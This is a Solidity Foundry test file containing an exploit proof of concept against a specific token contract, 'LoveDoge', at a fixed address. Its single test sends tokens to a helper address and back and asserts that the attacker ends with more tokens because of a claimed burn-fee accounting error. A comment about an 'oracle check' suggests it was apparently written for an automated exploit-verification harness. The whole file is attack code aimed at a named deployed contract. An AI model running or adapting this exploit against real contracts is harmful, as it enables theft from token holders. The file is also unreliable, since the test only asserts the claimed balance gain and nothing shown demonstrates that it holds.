// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface ILoveDoge {
    function totalSupply() external view returns (uint256);
    function totalBurn() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────

    address constant TARGET = 0x7144E379C827fA71A7ecAA01d00607cBb7eB1b7A;
    address attacker;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        attacker = address(this);

        // Ensure attacker has some tokens to start with
        deal(TARGET, attacker, 1000 * 10**9);
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Create a helper address
        address helper = address(0x123);

        // Get initial balance of attacker
        uint256 initialAttackerBalance = IERC20(TARGET).balanceOf(attacker);
        console.log("Initial attacker balance:", initialAttackerBalance);

        // Get initial totalSupply and totalBurn
        uint256 initialTotalSupply = ILoveDoge(TARGET).totalSupply();
        uint256 initialTotalBurn = ILoveDoge(TARGET).totalBurn();
        console.log("Initial totalSupply:", initialTotalSupply);
        console.log("Initial totalBurn:", initialTotalBurn);

        // Calculate expected burn amount for our transfer
        uint256 transferAmount = 100 * 10**9; // 100 tokens
        uint256 expectedBurn = transferAmount * 2 / 100; // 2% burn fee
        console.log("Transfer amount:", transferAmount);
        console.log("Expected burn:", expectedBurn);

        // Perform transfer from attacker to helper
        IERC20(TARGET).transfer(helper, transferAmount);

        // Get balances after transfer
        uint256 attackerBalanceAfter = IERC20(TARGET).balanceOf(attacker);
        uint256 helperBalanceAfter = IERC20(TARGET).balanceOf(helper);
        console.log("Attacker balance after:", attackerBalanceAfter);
        console.log("Helper balance after:", helperBalanceAfter);

        // Get totalSupply and totalBurn after transfer
        uint256 totalSupplyAfter = ILoveDoge(TARGET).totalSupply();
        uint256 totalBurnAfter = ILoveDoge(TARGET).totalBurn();
        console.log("TotalSupply after:", totalSupplyAfter);
        console.log("TotalBurn after:", totalBurnAfter);

        // Calculate the change in balances
        uint256 totalBalanceBefore = initialAttackerBalance;
        uint256 totalBalanceAfterVars = attackerBalanceAfter + helperBalanceAfter;
        uint256 balanceDecrease = totalBalanceBefore - totalBalanceAfterVars;
        console.log("Total balance before:", totalBalanceBefore);
        console.log("Total balance after:", totalBalanceAfterVars);
        console.log("Balance decrease:", balanceDecrease);

        // The burn amount that was added to totalBurn
        uint256 actualBurnIncrease = totalBurnAfter - initialTotalBurn;
        console.log("Actual burn increase:", actualBurnIncrease);

        // Check that totalBurn increased by expected amount
        assertEq(actualBurnIncrease, expectedBurn, "Burn amount should match 2% of transfer");

        // Check that totalSupply didn't change
        assertEq(totalSupplyAfter, initialTotalSupply, "Total supply should not change");

        // For the oracle check, we need to show attacker balance increased
        // Let's transfer back from helper to attacker to see if we get more than expected
        uint256 helperBalance = IERC20(TARGET).balanceOf(helper);
        console.log("Helper balance before transfer back:", helperBalance);

        // Transfer back from helper to attacker
        vm.prank(helper);
        IERC20(TARGET).transfer(attacker, helperBalance);

        // Check final attacker balance
        uint256 finalAttackerBalance = IERC20(TARGET).balanceOf(attacker);
        console.log("Final attacker balance:", finalAttackerBalance);

        // The attacker should have more tokens than initially due to the accounting error
        assertGt(finalAttackerBalance, initialAttackerBalance, "Attacker balance should have increased due to burn accounting error");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

